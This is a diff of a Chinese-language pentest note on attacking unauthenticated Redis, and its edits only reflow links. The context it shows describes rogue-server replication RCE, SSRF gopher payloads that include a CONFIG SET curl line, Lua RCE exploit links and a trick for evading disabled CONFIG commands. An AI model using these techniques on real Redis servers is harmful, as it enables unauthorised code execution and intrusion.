@@ -415,9 +415,7 @@ OK
 
 受影响版本：<=5.0.5
 
-原始paper：
-
-https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
+原始paper：https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
 主要利用方法如下：
 ![/data/typora_assets/redis/20200719220535985.png](https://i.loli.net/2020/07/24/mHsyYI4wLjpgfNh.png)
 第一步，我们伪装一个redis数据库，然后目标redis将我们的redis数据库设置为主节点。
@@ -429,9 +427,7 @@ https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitati
 
 利用条件：必需一个外网IP模拟redis rogue server，且内网redis能出外网。
 
-现在网上大部分的利用方法都是攻击外网未授权redis，比如已有的exp：
-
-https://github.com/Ridter/redis-rce
+现在网上大部分的利用方法都是攻击外网未授权redis，比如已有的exp：https://github.com/Ridter/redis-rce
 
 对于攻击内网未授权redis，比如利用ssrf gopher协议，是需要在外网模拟redis rogue server，内网构造payload发送的。笔者实际演示一下，
 
@@ -631,25 +627,15 @@ $ curl -v 'gopher://127.0.0.1:6379/_%2a4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSE
 
 ## Lua RCE
 
-原理：
+原理：https://www.anquanke.com/post/id/151203/
 
-https://www.anquanke.com/post/id/151203/
+exp：https://github.com/QAX-A-Team/redis_lua_exploit/
 
-exp：
-
-https://github.com/QAX-A-Team/redis_lua_exploit/
-
-docker测试，redis版本4.0.14，修改redis_lua.py中的ip和port之后运行，报错：
-
-https://github.com/QAX-A-Team/redis_lua_exploit/issues/1
-
-尚未解决
+docker测试，redis版本4.0.14，修改redis_lua.py中的ip和port之后运行，报错：https://github.com/QAX-A-Team/redis_lua_exploit/issues/1 尚未解决
 
 ## Tips
 
-参考
-
-https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt
+参考https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt
 
 > If target redis disabled `CONFIG SET`, `SAVE` commands, try to use `EVAL "return redis.call('config', 'set', 'dir', '/root')"`, `BGSAVE`, it only works on Redis 4.x. 
 > On Redis 5.x, CONFIG command is a "no-script" command, which means you cannot invoke this command in Redis lua.
